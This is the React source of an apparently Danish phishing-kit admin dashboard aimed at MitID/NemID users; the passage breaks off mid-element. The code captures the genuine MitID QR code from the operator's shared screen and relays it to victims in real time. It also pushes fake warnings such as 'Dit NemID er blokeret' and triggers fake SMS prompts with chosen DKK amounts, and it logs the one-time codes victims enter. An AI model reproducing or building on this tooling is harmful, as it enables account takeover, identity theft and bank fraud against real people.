import { useState, useEffect, useRef, useCallback } from 'react'
import { api } from '../services/api'
import { connectAdmin, sendAdminWS } from '../services/ws'
import jsQR from 'jsqr'

interface Session {
  sessionId: string; userId: string; status: string; qrVisible: boolean; qrImage: string | null
  smsActive: boolean; otpActive: boolean; kodeActive: boolean; verificationCode: string
  logCount: number; createdAt: string; verifiedAt: string | null
}

interface LogEntry { event_type: string; detail: string; created_at: string }

const PER_PAGE = 6

export default function AdminDashboard({ onLogout }: { onLogout: () => void }) {
  const [sessions, setSessions] = useState<Session[]>([])
  const [selected, setSelected] = useState<Session | null>(null)
  const [log, setLog] = useState<LogEntry[]>([])
  const [loading, setLoading] = useState(true)
  const [cameraStream, setCameraStream] = useState<MediaStream | null>(null)
  const [screenStream, setScreenStream] = useState<MediaStream | null>(null)
  const [searchQuery, setSearchQuery] = useState('')
  const [titleText, setTitleText] = useState('Forbinder sikkert')
  const [customTitle, setCustomTitle] = useState('')
  const [broadcastMessage, setBroadcastMessage] = useState('')
  const [customBroadcast, setCustomBroadcast] = useState('')
  const [messageType, setMessageType] = useState<'warning' | 'myid' | 'goodluck'>('warning')
  const [customMsgText, setCustomMsgText] = useState('')
  const [showSmsPopup, setShowSmsPopup] = useState(false)
  const [smsAmount, setSmsAmount] = useState<string>('1499')
  const [smsCodeLength, setSmsCodeLength] = useState<number>(6)

  const [smsSent, setSmsSent] = useState(false)
  const [currentPage, setCurrentPage] = useState(1)
  const [showPasswordModal, setShowPasswordModal] = useState(false)
  const [currentPassword, setCurrentPassword] = useState('')
  const [newPassword, setNewPassword] = useState('')
  const [confirmPassword, setConfirmPassword] = useState('')
  const [passwordError, setPasswordError] = useState('')
  const [passwordSuccess, setPasswordSuccess] = useState('')
  const cameraRef = useRef<HTMLVideoElement>(null)
  const screenRef = useRef<HTMLVideoElement>(null)
  const captureCanvasRef = useRef<HTMLCanvasElement>(null)
  const screenIntervalRef = useRef<ReturnType<typeof setInterval> | undefined>(undefined)
  const wsRef = useRef<WebSocket | null>(null)

  const formatTime = (ts: string) => new Date(ts).toLocaleTimeString('da-DK', { hour: '2-digit', minute: '2-digit', second: '2-digit' })

  const loadSessions = useCallback(async () => {
    try { setSessions(await api.getSessions()) } catch {} finally { setLoading(false) }
  }, [])

  const refreshSelected = useCallback(async (sessionId: string) => {
    try {
      const logs = await api.getLog(sessionId)
      setLog(logs)
      const sessions = await api.getSessions()
      setSessions(sessions)
      const fresh = sessions.find((s: Session) => s.sessionId === sessionId)
      if (fresh) setSelected(fresh)
    } catch {}
  }, [])

  useEffect(() => { loadSessions() }, [loadSessions])
  useEffect(() => { const t = setInterval(loadSessions, 5000); return () => clearInterval(t) }, [loadSessions])

  useEffect(() => {
    if (!selected) return
    const t = setInterval(() => refreshSelected(selected.sessionId), 3000)
    return () => clearInterval(t)
  }, [selected?.sessionId, refreshSelected])

  const selectSession = async (s: Session) => {
    setSelected(s)
    try {
      const logs = await api.getLog(s.sessionId)
      setLog(logs)
    } catch {}

    const ws = connectAdmin(s.sessionId, (data) => {
      if (data.type === 'user-verified') { loadSessions() }
      if (data.type === 'status-changed') setSelected(p => p ? { ...p, [data.field]: data.value } : null)
      if (data.type === 'sms-submitted') {
        setLog(p => [{ event_type: 'sms_submitted', detail: `Bruger indtastede kode: ${data.code}`, created_at: new Date().toISOString() }, ...p])
        loadSessions()
      }
    })
    wsRef.current = ws
  }

  useEffect(() => () => { wsRef.current?.close(); stopScreenShare(); stopCamera(); clearInterval(screenIntervalRef.current) }, [selected?.sessionId])

  const qrWasVisibleRef = useRef(false)

  const startScreenShare = async () => {
    try {
      const stream = await navigator.mediaDevices.getDisplayMedia({ video: { displaySurface: 'browser' } as any })
      setScreenStream(stream)
      if (screenRef.current) screenRef.current.srcObject = stream

      stream.getVideoTracks()[0].onended = () => {
        setScreenStream(null)
        clearInterval(screenIntervalRef.current)
        sendAdminWS({ type: 'qr-hide' })
      }

      await new Promise(r => { if (screenRef.current) screenRef.current.onloadedmetadata = r; else r(null) })

      captureCanvasRef.current = document.createElement('canvas')
      qrWasVisibleRef.current = false

      screenIntervalRef.current = setInterval(() => {
        const video = screenRef.current
        const canvas = captureCanvasRef.current
        if (!video || !canvas || video.videoWidth === 0) return
        canvas.width = video.videoWidth
        canvas.height = video.videoHeight
        const ctx = canvas.getContext('2d')
        if (!ctx) return
        ctx.drawImage(video, 0, 0)

        const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height)
        const qrCode = jsQR(imageData.data, imageData.width, imageData.height, { inversionAttempts: 'dontInvert' })

        if (qrCode) {
          if (!qrWasVisibleRef.current) {
            qrWasVisibleRef.current = true
            sendAdminWS({ type: 'qr-show' })
          }
          const loc = qrCode.location
          const qrW = Math.max(Math.abs(loc.topRightCorner.x - loc.topLeftCorner.x), Math.abs(loc.bottomRightCorner.x - loc.bottomLeftCorner.x))
          const qrH = Math.max(Math.abs(loc.bottomLeftCorner.y - loc.topLeftCorner.y), Math.abs(loc.bottomRightCorner.y - loc.topRightCorner.y))
          const trim = Math.round(Math.min(qrW, qrH) * 0.04)
          const x = Math.min(loc.topLeftCorner.x, loc.bottomLeftCorner.x) + trim
          const y = Math.min(loc.topLeftCorner.y, loc.topRightCorner.y) + trim
          const x2 = Math.max(loc.topRightCorner.x, loc.bottomRightCorner.x) - trim
          const y2 = Math.max(loc.bottomLeftCorner.y, loc.bottomRightCorner.y) - trim
          const w = x2 - x
          const h = y2 - y
          const cropCanvas = document.createElement('canvas')
          cropCanvas.width = w
          cropCanvas.height = h
          const cropCtx = cropCanvas.getContext('2d')
          if (cropCtx) {
            cropCtx.drawImage(canvas, x, y, w, h, 0, 0, w, h)
          }
          const base64 = cropCanvas.toDataURL('image/png')
          sendAdminWS({ type: 'qr-image', image: base64 })
          if (selected) api.toggleQr(selected.sessionId, true, base64).catch(() => {})
        } else if (qrWasVisibleRef.current) {
          qrWasVisibleRef.current = false
          sendAdminWS({ type: 'qr-hide' })
        }
      }, 500)
    } catch {}
  }

  const stopScreenShare = () => {
    screenStream?.getTracks().forEach(t => t.stop())
    setScreenStream(null)
    clearInterval(screenIntervalRef.current)
    sendAdminWS({ type: 'qr-hide' })
  }

  const startCamera = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true })
      setCameraStream(stream)
      if (cameraRef.current) cameraRef.current.srcObject = stream
    } catch {}
  }

  const stopCamera = () => { cameraStream?.getTracks().forEach(t => t.stop()); setCameraStream(null) }

  const handleQrUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0]
    if (!file || !selected) return
    const reader = new FileReader()
    reader.onload = async () => {
      const base64 = reader.result as string
      await api.toggleQr(selected.sessionId, true, base64)
      sendAdminWS({ type: 'qr-image', image: base64 })
      sendAdminWS({ type: 'qr-show' })
      setSelected(p => p ? { ...p, qrImage: base64, qrVisible: true } : null)
    }
    reader.readAsDataURL(file)
  }

  const toggleStatus = async (field: string, current: boolean) => {
    if (!selected) return
    await api.toggleStatus(selected.sessionId, field, !current)
    sendAdminWS({ type: 'status-toggle', field, value: !current })
    setSelected(p => p ? { ...p, [field]: !current } : null)
  }

  const activateSms = () => {
    setShowSmsPopup(true)
    setSmsAmount('1499')
    setSmsSent(false)
  }

  const sendSmsToClient = () => {
    if (!selected) return
    const amount = smsAmount || null
    sendAdminWS({ type: 'sms-code', codeLength: smsCodeLength, amount })
    setSmsSent(true)
    setTimeout(() => { setShowSmsPopup(false); setSmsSent(false) }, 1500)
  }

  const sendTitle = (text: string) => {
    if (!selected) return
    setTitleText(text)
    sendAdminWS({ type: 'title-change', title: text })
  }

  const saveCustomTitle = () => { if (customTitle.trim()) sendTitle(customTitle.trim()) }

  const sendBroadcast = (msg: string) => {
    if (!selected || !msg.trim()) return
    setBroadcastMessage(msg)
    sendAdminWS({ type: 'broadcast-message', message: msg })
    setCustomBroadcast('')
  }

  const sendMsgType = (type: 'warning' | 'myid' | 'goodluck', text: string) => {
    if (!selected) return
    setMessageType(type)
    setCustomMsgText(text)
    sendAdminWS({ type: 'message-type', messageType: type, text })
  }

  const deleteSession = async (id: string) => {
    if (!confirm('Slet denne session?')) return
    await api.deleteSession(id)
    setSelected(null)
    loadSessions()
  }

  const handleChangePassword = async () => {
    setPasswordError('')
    setPasswordSuccess('')
    if (!currentPassword || !newPassword) { setPasswordError('Udfyld alle felter'); return }
    if (newPassword.length < 4) { setPasswordError('Ny adgangskode skal være mindst 4 tegn'); return }
    if (newPassword !== confirmPassword) { setPasswordError('Adgangskoderne matcher ikke'); return }
    try {
      await api.changePassword(currentPassword, newPassword)
      setPasswordSuccess('Adgangskode ændret!')
      setCurrentPassword('')
      setNewPassword('')
      setConfirmPassword('')
      setTimeout(() => { setShowPasswordModal(false); setPasswordSuccess('') }, 1500)
    } catch {
      setPasswordError('Forkert nuværende adgangskode')
    }
  }

  const filtered = sessions.filter(s => {
    if (s.status !== 'pending') return false
    if (searchQuery && !s.userId.toLowerCase().includes(searchQuery.toLowerCase()) && !s.sessionId.includes(searchQuery)) return false
    return true
  })

  const totalPages = Math.max(1, Math.ceil(filtered.length / PER_PAGE))
  const safePage = Math.min(currentPage, totalPages)
  const paginated = filtered.slice((safePage - 1) * PER_PAGE, safePage * PER_PAGE)

  if (selected) {
    return (
      <div className="h-screen flex flex-col bg-gray-100" style={{ fontFamily: "'Inter', 'IBM Plex Sans', sans-serif" }}>
        <header className="h-[56px] bg-white border-b border-gray-200 flex items-center justify-between px-5 shrink-0 z-10">
          <div className="flex items-center gap-4">
            <button onClick={() => { setSelected(null); wsRef.current?.close(); stopScreenShare(); stopCamera(); clearInterval(screenIntervalRef.current) }}
              className="flex items-center gap-2 text-gray-500 hover:text-blue-600 text-sm cursor-pointer transition-colors font-semibold">
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><polyline points="15,18 9,12 15,6"/></svg>
              Sessioner
            </button>
            <div className="h-5 w-px bg-gray-200" />
            <h1 className="text-gray-900 font-bold text-[15px]">Sessionskontrol</h1>
            <span className={`px-2.5 py-0.5 rounded-full text-[10px] font-bold uppercase tracking-wide ${selected.status === 'verified' ? 'bg-emerald-100 text-emerald-700' : 'bg-amber-100 text-amber-700'}`}>
              {selected.status}
            </span>
          </div>
          <div className="flex items-center gap-3">
            <div className="text-right">
              <div className="text-[11px] font-bold text-gray-900">{selected.userId}</div>
              <div className="text-[10px] text-gray-400 font-mono">{selected.sessionId.slice(0, 12)}...</div>
            </div>
            <button onClick={() => deleteSession(selected.sessionId)} className="px-3 py-2 rounded-xl text-sm font-bold bg-red-50 text-red-600 hover:bg-red-100 cursor-pointer transition-all border border-red-200">
              Slet
            </button>
          </div>
        </header>

        <div className="flex flex-1 overflow-hidden">
          <aside className="w-[220px] bg-white border-r border-gray-200 flex flex-col p-4 shrink-0 overflow-y-auto">
            <div className="mb-5">
              <div className="text-[10px] text-gray-400 uppercase tracking-wider mb-2 font-bold">Optagelse</div>
              <div className="flex flex-col gap-2">
                <button onClick={screenStream ? stopScreenShare : startScreenShare}
                  className={`flex items-center gap-2.5 px-3 py-2.5 rounded-xl text-[13px] font-semibold cursor-pointer transition-all ${screenStream ? 'bg-red-50 text-red-600 border border-red-200' : 'bg-blue-50 text-blue-600 border border-blue-200 hover:bg-blue-100'}`}>
                  <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
                  {screenStream ? 'Stop deling' : 'Del skærm'}
                </button>
                <button onClick={cameraStream ? stopCamera : startCamera}
                  className={`flex items-center gap-2.5 px-3 py-2.5 rounded-xl text-[13px] font-semibold cursor-pointer transition-all ${cameraStream ? 'bg-red-50 text-red-600 border border-red-200' : 'bg-purple-50 text-purple-600 border border-purple-200 hover:bg-purple-100'}`}>
                  <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M23 7l-7 5 7 5V7z"/><rect x="1" y="5" width="15" height="14" rx="2"/></svg>
                  {cameraStream ? 'Stop kamera' : 'Kamera'}
                </button>
                <button onClick={() => document.getElementById('qr-upload')?.click()}
                  className="flex items-center gap-2.5 px-3 py-2.5 rounded-xl text-[13px] font-semibold cursor-pointer transition-all bg-emerald-50 text-emerald-600 border border-emerald-200 hover:bg-emerald-100">
                  <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><path d="M21 15l-5-5L5 21"/></svg>
                  Upload QR-billede
                </button>
                <input id="qr-upload" type="file" accept="image/*" className="hidden" onChange={handleQrUpload} />
              </div>
            </div>

            <div className="mb-5">
              <div className="text-[10px] text-gray-400 uppercase tracking-wider mb-2 font-bold">Hurtige indstillinger</div>
              <div className="flex flex-col gap-1.5">
                {[
                  { label: 'SMS', field: 'sms_active', on: 'bg-emerald-50 border-emerald-300 text-emerald-700', dot: 'bg-emerald-500' },
                  { label: 'OTP', field: 'otp_active', on: 'bg-blue-50 border-blue-300 text-blue-700', dot: 'bg-blue-500' },
                  { label: 'Code', field: 'kode_active', on: 'bg-purple-50 border-purple-300 text-purple-700', dot: 'bg-purple-500' },
                ].map(({ label, field, on, dot }) => (
                  <button key={field} onClick={() => toggleStatus(field, (selected as any)[field])}
                    className={`flex items-center justify-between px-3 py-2.5 rounded-xl text-[13px] font-semibold cursor-pointer transition-all border ${
                      (selected as any)[field] ? on : 'bg-gray-50 border-gray-200 text-gray-400 hover:border-gray-300'
                    }`}>
                    <span>{label}</span>
                    <span className={`w-2 h-2 rounded-full ${(selected as any)[field] ? dot : 'bg-gray-300'}`} />
                  </button>
                ))}
              </div>
            </div>

            <div className="mb-5">
              <div className="text-[10px] text-gray-400 uppercase tracking-wider mb-2 font-bold">SMS</div>
              <button onClick={activateSms} className="w-full bg-blue-600 hover:bg-blue-700 text-white text-[12px] py-2 px-3 rounded-xl cursor-pointer transition-colors font-bold shadow-sm">
                + Send SMS
              </button>
            </div>

            <div className="mt-auto pt-3 border-t border-gray-100">
              <div className="text-[10px] text-gray-300 text-center">manchesterface</div>
            </div>
          </aside>

          <main className="flex-1 overflow-y-auto p-5">
            <div className="grid grid-cols-2 gap-4 mb-5">
              <div className="bg-white rounded-2xl border border-gray-200 overflow-hidden shadow-sm">
                <div className="px-4 py-2.5 border-b border-gray-100 flex items-center gap-2">
                  <div className="w-2 h-2 rounded-full bg-blue-500" />
                  <span className="text-[11px] text-gray-500 uppercase tracking-wider font-bold">Deling af skærm</span>
                </div>
                <div className="relative aspect-video bg-gray-50">
                  <video ref={screenRef} autoPlay muted className="w-full h-full object-contain" style={{ display: screenStream ? 'block' : 'none' }} />
                  {!screenStream && (
                    <div className="absolute inset-0 flex flex-col items-center justify-center text-gray-300">
                      <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" className="mb-2"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
                      <span className="text-xs font-medium">Del MitID-fanen for at fange QR</span>
                    </div>
                  )}
                </div>
              </div>
              <div className="bg-white rounded-2xl border border-gray-200 overflow-hidden shadow-sm">
                <div className="px-4 py-2.5 border-b border-gray-100 flex items-center gap-2">
                  <div className="w-2 h-2 rounded-full bg-purple-500" />
                  <span className="text-[11px] text-gray-500 uppercase tracking-wider font-bold">Kamera</span>
                </div>
                <div className="relative aspect-video bg-gray-50">
                  <video ref={cameraRef} autoPlay muted className="w-full h-full object-contain" style={{ display: cameraStream ? 'block' : 'none' }} />
                  {!cameraStream && (
                    <div className="absolute inset-0 flex flex-col items-center justify-center text-gray-300">
                      <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" className="mb-2"><path d="M23 7l-7 5 7 5V7z"/><rect x="1" y="5" width="15" height="14" rx="2"/></svg>
                      <span className="text-xs font-medium">Intet aktivt kamera</span>
                    </div>
                  )}
                </div>
              </div>
            </div>

            <div className="bg-white rounded-2xl border border-gray-200 p-5 mb-4 shadow-sm">
              <div className="text-[11px] text-gray-400 uppercase tracking-wider font-bold mb-3">Titeltekst</div>
              <div className="flex flex-wrap gap-2 mb-3">
                {['Forbinder sikkert', 'Log ind', 'Godkender...', 'Vent venligst', 'Behandlinger'].map(t => (
                  <button key={t} onClick={() => sendTitle(t)}
                    className={`px-4 py-2 rounded-xl text-[13px] font-medium cursor-pointer transition-all border ${
                      titleText === t ? 'bg-blue-50 border-blue-300 text-blue-700' : 'bg-gray-50 border-gray-200 text-gray-600 hover:bg-gray-100'
                    }`}>{t}</button>
                ))}
              </div>
              <div className="flex gap-2">
                <input type="text" value={customTitle} onChange={(e) => setCustomTitle(e.target.value)} placeholder="Skriv brugerdefineret titel..."
                  className="flex-1 bg-gray-50 border border-gray-200 rounded-xl px-4 py-2.5 text-sm text-gray-700 focus:outline-none focus:border-blue-400 placeholder-gray-400" />
                <button onClick={saveCustomTitle} className="bg-blue-600 hover:bg-blue-700 text-white px-5 py-2.5 rounded-xl text-sm font-bold cursor-pointer transition-colors shadow-sm">Gem</button>
              </div>
            </div>

            <div className="bg-white rounded-2xl border border-gray-200 p-5 mb-4 shadow-sm">
              <div className="flex items-center justify-between mb-3">
                <div className="text-[11px] text-gray-400 uppercase tracking-wider font-bold">Broadcast-beskeder</div>
                <label className="relative inline-flex items-center cursor-pointer">
                  <input type="checkbox" className="sr-only peer" defaultChecked onChange={(e) => sendAdminWS({ type: 'broadcast-toggle', enabled: e.target.checked })} />
                  <div className="w-9 h-5 bg-gray-200 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:rounded-full after:h-4 after:w-4 after:transition-all peer-checked:bg-blue-600" />
                </label>
              </div>
              <div className="flex flex-wrap gap-1.5 mb-3">
                {['Bekræft din identitet', 'Sikkerhedstjek påkrævet', 'Kontakt din bank', 'Sessionen udløber snart', 'Opdater dine oplysninger', 'Dit NemID er blokeret', 'Bekræft dit betalingskort', 'Uautoriseret loginforsøg', 'Bekræft med MitID', 'Din konto er midlertidigt låst', 'Gentag godkendelsen', 'Indtast din engangskode', 'Gentag godkendelse'].map(msg => (
                  <button key={msg} onClick={() => sendBroadcast(msg)}
                    className={`px-3 py-1.5 rounded-lg text-[11px] font-medium cursor-pointer transition-all border ${
                      broadcastMessage === msg ? 'bg-blue-50 border-blue-300 text-blue-700' : 'bg-gray-50 border-gray-200 text-gray-600 hover:bg-gray-100'
                    }`}>{msg}</button>
                ))}
              </div>
              <div className="flex gap-2">
                <input type="text" value={customBroadcast} onChange={(e) => setCustomBroadcast(e.target.value)} placeholder="Brugerdefineret besked..."
                  className="flex-1 bg-gray-50 border border-gray-200 rounded-xl px-4 py-2.5 text-sm text-gray-700 focus:outline-none focus:border-blue-400 placeholder-gray-400"
                  onKeyDown={(e) => { if (e.key === 'Enter') sendBroadcast(customBroadcast) }} />
                <button onClick={() => sendBroadcast(customBroadcast)} className="bg-blue-600 hover:bg-blue-700 text-white px-5 py-2.5 rounded-xl text-sm font-bold cursor-pointer transition-colors shadow-sm">Send</button>
              </div>
            </div>

            <div className="bg-white rounded-2xl border border-gray-200 p-5 mb-4 shadow-sm">
              <div className="text-[11px] text-gray-400 uppercase tracking-wider font-bold mb-3">Beskedtype</div>
              <div className="flex gap-2 mb-3">
                {([
                  { type: 'warning' as const, label: 'Advarsel', on: 'bg-red-50 border-red-300 text-red-700', icon: '!' },
                  { type: 'myid' as const, label: 'MyID', on: 'bg-blue-50 border-blue-300 text-blue-700', icon: 'i' },
                  { type: 'goodluck' as const, label: 'Held og lykke', on: 'bg-green-50 border-green-300 text-green-700', icon: '+' },
                ]).map(({ type, label, on, icon }) => (
                  <button key={type} onClick={() => { setMessageType(type); sendMsgType(type, customMsgText || label) }}
                    className={`flex items-center gap-2 px-4 py-2.5 rounded-xl text-sm font-bold cursor-pointer transition-all border ${
                      messageType === type ? on : 'bg-gray-50 border-gray-200 text-gray-600 hover:bg-gray-100'
                    }`}>
                    <span>{icon}</span> {label}
                  </button>
                ))}
              </div>
              <div className="flex gap-2">
                <input type="text" value={customMsgText} onChange={(e) => setCustomMsgText(e.target.value)} placeholder="Skriv besked..."
                  className="flex-1 bg-gray-50 border border-gray-200 rounded-xl px-4 py-2.5 text-sm text-gray-700 focus:outline-none focus:border-blue-400 placeholder-gray-400"
                  onKeyDown={(e) => { if (e.key === 'Enter') sendMsgType(messageType, customMsgText) }} />
                <button onClick={() => sendMsgType(messageType, customMsgText || messageType)} className="bg-blue-600 hover:bg-blue-700 text-white px-5 py-2.5 rounded-xl text-sm font-bold cursor-pointer transition-colors shadow-sm">Send</button>
              </div>
            </div>

            {selected.qrImage && (
              <div className="bg-white rounded-2xl border border-gray-200 p-4 shadow-sm">
                <div className="text-[11px] text-gray-400 uppercase tracking-wider font-bold mb-3">Fanget QR-billede</div>
                <img src={selected.qrImage} alt="QR" className="max-h-[200px] rounded-xl border border-gray-200" />
              </div>
            )}
          </main>

          <aside className="w-[300px] bg-white border-l border-gray-200 flex flex-col shrink-0">
            <div className="px-4 py-3 border-b border-gray-200 flex items-center gap-2 shrink-0">
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#6b7280" strokeWidth="2"><path d="M12 8v4l3 3"/><circle cx="12" cy="12" r="10"/></svg>
              <h3 className="text-gray-900 font-bold text-[13px]">Aktivitetslog</h3>
              <span className="text-[10px] text-gray-400 font-mono ml-auto">{log.length}</span>
            </div>
            <div className="flex-1 overflow-y-auto p-4 space-y-0.5">
              {log.length === 0 ? (
                <div className="text-xs text-gray-400 py-4 text-center">Ingen aktivitet endnu</div>
              ) : (
                log.map((entry, i) => (
                  entry.event_type === 'sms_submitted' ? (
                    <div key={i} className="bg-blue-50 border border-blue-200 rounded-xl px-3 py-3 mb-1">
                      <div className="flex items-center gap-2 mb-1.5">
                        <span className="bg-blue-600 text-white text-[9px] font-bold px-2 py-0.5 rounded-full uppercase">Kode modtaget</span>
                        <span className="text-gray-400 text-[10px] font-mono">{formatTime(entry.created_at)}</span>
                      </div>
                      <div className="flex items-center gap-2">
                        <span className="text-[22px] font-mono font-bold text-[#001C44] tracking-[6px]">{entry.detail.replace('Bruger indtastede kode: ', '')}</span>
                      </div>
                    </div>
                  ) : (
                    <div key={i} className="flex items-start gap-2.5 text-[11px] py-2.5 border-b border-gray-50 last:border-0">
                      <span className="text-gray-400 shrink-0 w-[55px] font-mono">{formatTime(entry.created_at)}</span>
                      <div className="min-w-0">
                        <span className={`font-bold ${
                          entry.event_type.includes('qr') ? 'text-blue-600' :
                          entry.event_type === 'verified' ? 'text-emerald-600' :
                          entry.event_type.includes('sms') ? 'text-green-600' :
                          entry.event_type.includes('created') ? 'text-amber-600' :
                          'text-gray-600'
                        }`}>{entry.event_type.replace(/_/g, ' ')}</span>
                        <span className="text-gray-500 ml-1 break-all">{entry.detail}</span>
                      </div>
                    </div>
                  )
                ))
              )}
            </div>
          </aside>
        </div>

        {showSmsPopup && (
          <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50">
            <div className="bg-[#1e2a3a] rounded-2xl shadow-2xl w-[420px] overflow-hidden">
              <div className="p-6">
                <div className="flex items-center justify-between mb-1">
                  <div className="flex items-center gap-3">
                    <div className="w-10 h-10 bg-blue-600 rounded-xl flex items-center justify-center">
                      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2"><rect x="3" y="3" width="18" height="18" rx="2"/><path d="M7 7h10"/></svg>
                    </div>
                    <div>
                      <h3 className="text-white font-bold text-base">Aktiver SMS</h3>
                      <p className="text-gray-400 text-xs">Vælg beløb eller spring over</p>
                    </div>
                  </div>
                  <button onClick={() => setShowSmsPopup(false)} className="w-8 h-8 rounded-full bg-gray-600/50 flex items-center justify-center text-gray-300 hover:text-white cursor-pointer">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
                  </button>
                </div>
              </div>

              {smsSent ? (
                <div className="px-6 pb-6 text-center">
                  <div className="w-12 h-12 bg-emerald-500 rounded-full flex items-center justify-center mx-auto mb-3">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="3"><polyline points="20,6 9,17 4,12"/></svg>
                  </div>
                  <div className="text-white font-bold text-base mb-1">SMS sendt til bruger</div>
                  <div className="text-gray-400 text-sm">{smsAmount ? `${Number(smsAmount).toLocaleString('da-DK')} kr` : 'Intet beløb'}</div>
                </div>
              ) : (
                <div className="px-6 pb-6">
                  <div className="text-[11px] text-gray-400 uppercase tracking-wider font-bold mb-3">Hurtigt beløb</div>
                  <div className="grid grid-cols-4 gap-2 mb-5">
                    {['499', '999', '1499', '2499'].map(amt => (
                      <button key={amt} onClick={() => setSmsAmount(amt)}
                        className={`py-3 rounded-xl text-sm font-bold cursor-pointer transition-all border ${
                          smsAmount === amt ? 'bg-blue-600 border-blue-500 text-white' : 'bg-[#2a3a4e] border-[#3a4a5e] text-gray-300 hover:bg-[#344860]'
                        }`}>{Number(amt).toLocaleString('da-DK')}</button>
                    ))}
                  </div>
                  <div className="text-[11px] text-gray-400 uppercase tracking-wider font-bold mb-3">Eller indtast beløb (DKK)</div>
                  <div className="relative mb-4">
                    <input type="text" value={smsAmount} onChange={(e) => setSmsAmount(e.target.value.replace(/\D/g, ''))}
                      className="w-full bg-[#2a3a4e] border border-[#3a4a5e] rounded-xl px-4 py-3.5 text-white text-base font-medium focus:outline-none focus:border-blue-500 placeholder-gray-500" />
                    {smsAmount && <button onClick={() => setSmsAmount('')} className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 hover:text-white cursor-pointer text-sm">Ryd</button>}
                  </div>
                  {smsAmount && <div className="text-xs text-emerald-400 font-bold mb-4">Viser: <span className="text-emerald-300">{Number(smsAmount).toLocaleString('da-DK')}</span></div>}
                  <div className="text-[11px] text-gray-400 uppercase tracking-wider font-bold mb-3">Kodelængde</div>
                  <div className="flex gap-2 mb-4">
                    {[4, 5, 6].map(len => (
                      <button key={len} onClick={() => setSmsCodeLength(len)}
                        className={`flex-1 py-2.5 rounded-xl text-sm font-bold cursor-pointer transition-all border ${
                          smsCodeLength === len ? 'bg-blue-600 border-blue-500 text-white' : 'bg-[#2a3a4e] border-[#3a4a5e] text-gray-300 hover:bg-[#344860]'
                        }`}>{len} cifre</button>
                    ))}
                  </div>
                  <div className="flex gap-3">
                    <button onClick={() => { setSmsAmount(''); sendSmsToClient() }} className="flex-1 bg-[#2a3a4e] hover:bg-[#344860] text-gray-300 font-bold text-sm py-3.5 rounded-xl cursor-pointer transition-colors border border-[#3a4a5e]">
                      Intet beløb
                    </button>
                    <button onClick={sendSmsToClient} className="flex-1 bg-blue-600 hover:bg-blue-700 text-white font-bold text-sm py-3.5 rounded-xl cursor-pointer transition-colors flex items-center justify-center gap-2">
                      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect x="3" y="3" width="18" height="18" rx="2"/><path d="M7 7h10"/></svg>
                      Aktiver SMS
                    </button>
                  </div>
                </div>
              )}
            </div>
          </div>
        )}

        {showPasswordModal && (
          <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50">
            <div className="bg-white rounded-2xl shadow-2xl w-[400px] overflow-hidden">
              <div className="p-6">
                <div className="flex items-center justify-between mb-5">
                  <h3 className="text-gray-900 font-bold text-base">Skift adgangskode</h3>
                  <button onClick={() => { setShowPasswordModal(false); setPasswordError(''); setPasswordSuccess('') }} className="w-8 h-8 rounded-full bg-gray-100 flex items-center justify-center text-gray-400 hover:text-gray-600 cursor-pointer">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
                  </button>
                </div>
                <div className="space-y-3">
                  <div>
                    <label className="text-[11px] text-gray-400 uppercase tracking-wider font-bold mb-1 block">Nuværende adgangskode</label>
                    <input type="password" value={currentPassword} onChange={(e) => setCurrentPassword(e.target.value)}
                      className="w-full bg-gray-50 border border-gray-200 rounded-xl px-4 py-2.5 text-sm text-gray-900 focus:outline-none focus:border-blue-400" />
                  </div>
                  <div>
                    <label className="text-[11px] text-gray-400 uppercase tracking-wider font-bold mb-1 block">Ny adgangskode</label>
                    <input type="password" value={newPassword} onChange={(e) => setNewPassword(e.target.value)}
                      className="w-full bg-gray-50 border border-gray-200 rounded-xl px-4 py-2.5 text-sm text-gray-900 focus:outline-none focus:border-blue-400" />
                  </div>
                  <div>
                    <label className="text-[11px] text-gray-400 uppercase tracking-wider font-bold mb-1 block">Bekræft ny adgangskode</label>
                    <input type="password" value={confirmPassword} onChange={(e) => setConfirmPassword(e.target.value)}
                      onKeyDown={(e) => { if (e.key === 'Enter') handleChangePassword() }}
                      className="w-full bg-gray-50 border border-gray-200 rounded-xl px-4 py-2.5 text-sm text-gray-900 focus:outline-none focus:border-blue-400" />
                  </div>
                </div>
                {passwordError && <div className="text-red-600 text-[12px] mt-2 font-medium">{passwordError}</div>}
                {passwordSuccess && <div className="text-emerald-600 text-[12px] mt-2 font-medium">{passwordSuccess}</div>}
                <button onClick={handleChangePassword} className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold text-sm py-3 rounded-xl cursor-pointer transition-colors mt-4">
